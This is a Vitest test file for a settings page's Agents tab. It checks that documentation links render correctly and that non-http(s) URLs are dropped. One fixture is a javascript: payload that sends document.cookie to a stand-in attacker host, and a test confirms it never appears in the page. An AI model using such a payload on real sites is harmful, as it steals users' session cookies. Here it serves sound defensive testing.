// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, cleanup } from '@testing-library/react';
import { MemoryRouter, Routes, Route } from 'react-router';
import '@testing-library/jest-dom/vitest';
import { Settings } from './Settings';
import menuSchemaFixture from '../test/fixtures/menuSchema';

/**
 * Guards the per-agent "learn more" link on the Agents tab.
 *
 * Why these tests exist: an agent card otherwise shows only an API-key field, so a
 * user who has not heard of the service has nothing to read before pasting a
 * credential. The link is agent-declared metadata (`info_url` from GET /api/agents)
 * rather than a provider table in this page, so a user-dropped agent module gets a
 * link too. How a regression manifests: the anchor disappears from the card, points
 * at the wrong agent's URL, or -- for a module-supplied URL -- renders a
 * non-http(s) href that would execute script in the page's origin.
 *
 * These drive the real <Settings> component with a mocked API boundary (the highest
 * level at which the rendered link is observable).
 */

// The real backend-generated catalog, so the page renders the production field set
// rather than a hand-written stub that would drift from it.
const menuSchema: unknown = menuSchemaFixture;

const OPENAI_INFO_URL = 'https://platform.openai.com/docs/models';
const ANTHROPIC_INFO_URL = 'https://docs.claude.com/en/docs/about-claude/models/overview';
// A hostile/mistaken user agent module: rendered as an href, this would run in the
// settings page's origin, so it must never reach the DOM.
const SCRIPT_URL = 'javascript:fetch("//attacker.test/"+document.cookie)';

// Shape-accurate /api/agents entries. `info_url` mirrors Agent.get_info(): an
// agent that declares no documentation link reports an empty string.
const agent = (id: string, name: string, infoUrl: string) => ({
  id,
  name,
  description: `${name} description`,
  requires_base_url: false,
  default_model: 'm-1',
  supports_model_listing: true,
  fields: [
    { key_base: 'coach_api_key', label: 'API Key', kind: 'secret' },
    { key_base: 'coach_model', label: 'Model', kind: 'model' },
  ],
  api_key_set: false,
  configured: false,
  model: '',
  base_url: '',
  info_url: infoUrl,
});

const agentsPayload = {
  agents: [
    agent('openai', 'OpenAI', OPENAI_INFO_URL),
    agent('anthropic', 'Anthropic', ANTHROPIC_INFO_URL),
    // A user agent module with no documentation link of its own.
    agent('homelab', 'Homelab', ''),
    // A user agent module whose link is not a web URL.
    agent('sneaky', 'Sneaky', SCRIPT_URL),
  ],
};

const settingsPayload = {
  PlayerOne: { type: 'human', name: '', engine: 'stockfish', elo: 'Default', hand_brain_mode: 'normal' },
  PlayerTwo: { type: 'engine', name: '', engine: 'stockfish', elo: 'Default', hand_brain_mode: 'normal' },
  game: {
    time_control: '0',
    analysis_mode: 'True',
    analysis_engine: 'stockfish',
    notation: 'figurine',
    coach_provider: 'none',
    coach_id: 'off',
  },
  lichess: { api_token: '', range: '' },
  sound: {},
  system: { inactivity_timeout: '900' },
  DATABASE: { database_uri: '' },
};

const idleEngineStatus = {
  active: false,
  installing: false,
  engine: null,
  display_name: null,
  stage: null,
  message: '',
  percent: 0,
  interrupted: false,
  result: null,
};

interface JsonResponseLike {
  ok: boolean;
  status: number;
  json: () => Promise<unknown>;
  text: () => Promise<string>;
}

function jsonResponse(body: unknown, status = 200): JsonResponseLike {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => body,
    text: async () => JSON.stringify(body),
  };
}

// jsdom has no EventSource; the page opens one for background updates.
class MockEventSource {
  url: string;
  constructor(url: string) {
    this.url = url;
  }
  close(): void {}
  addEventListener(): void {}
  removeEventListener(): void {}
}

beforeEach(() => {
  vi.stubGlobal(
    'fetch',
    vi.fn(async (url: string): Promise<JsonResponseLike> => {
      if (url === '/api/menu-schema') return jsonResponse(menuSchema);
      if (url === '/api/settings') return jsonResponse(settingsPayload);
      if (url === '/api/engines/all') return jsonResponse([]);
      if (url === '/api/sprites') return jsonResponse(['default']);
      if (url === '/api/agents') return jsonResponse(agentsPayload);
      if (url === '/api/engines/status') return jsonResponse(idleEngineStatus);
      if (url.startsWith('/api/coaches')) return jsonResponse({ coaches: [], resolved: null });
      if (url.startsWith('/api/coach/models')) return jsonResponse({ models: ['m-1'] });
      return jsonResponse({});
    })
  );
  vi.stubGlobal('EventSource', MockEventSource);
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.clearAllMocks();
});

function renderAgentsTab() {
  return render(
    <MemoryRouter initialEntries={['/settings/agents']}>
      <Routes>
        <Route path="/settings/:tab" element={<Settings />} />
      </Routes>
    </MemoryRouter>
  );
}

describe('Agents tab documentation links', () => {
  it.each([
    ['OpenAI', OPENAI_INFO_URL],
    ['Anthropic', ANTHROPIC_INFO_URL],
  ])('links %s to the URL its agent declares', async (name, expectedUrl) => {
    // Each card must carry its own agent's link: the name is part of the link text
    // so the target is unambiguous with several cards on the page. A regression
    // reusing one agent's info_url for every card would fail the href assertion.
    renderAgentsTab();

    const link = await screen.findByRole('link', { name: `Learn more about ${name}` });
    expect(link).toHaveAttribute('href', expectedUrl);
    // Outbound link: new tab, and no window.opener handle back into this page.
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('renders a link for every agent that declares one, and no others', async () => {
    // Counting the links catches both directions of drift: a missing card's link
    // (fewer) and a link rendered for an agent with no/unusable URL (more). Two of
    // the four mocked agents declare a usable link.
    renderAgentsTab();
    await screen.findByRole('link', { name: 'Learn more about OpenAI' });

    const links = screen.getAllByRole('link', { name: /^Learn more about / });
    expect(links.map((link) => link.getAttribute('href'))).toEqual([
      OPENAI_INFO_URL,
      ANTHROPIC_INFO_URL,
    ]);
  });

  it('omits the link for an agent that declares no documentation URL', async () => {
    // An agent module need not supply a link; its card must render normally with the
    // link simply absent. Failure mode: an empty info_url rendering an href="" anchor
    // that reloads the settings page when clicked.
    renderAgentsTab();
    expect(await screen.findByText('Homelab description')).toBeInTheDocument();

    expect(screen.queryByRole('link', { name: 'Learn more about Homelab' })).not.toBeInTheDocument();
  });

  it('refuses to render a non-http(s) documentation URL as a link', async () => {
    // Security: info_url originates in a user-dropped agent module, and the browser
    // treats a `javascript:` href as executable in this page's origin. Such a value
    // must be dropped, not rendered. Failure manifests as the anchor existing (and
    // the script URL appearing in the DOM).
    renderAgentsTab();
    expect(await screen.findByText('Sneaky description')).toBeInTheDocument();

    expect(screen.queryByRole('link', { name: 'Learn more about Sneaky' })).not.toBeInTheDocument();
    expect(document.body.innerHTML).not.toContain('attacker.test');
  });
});
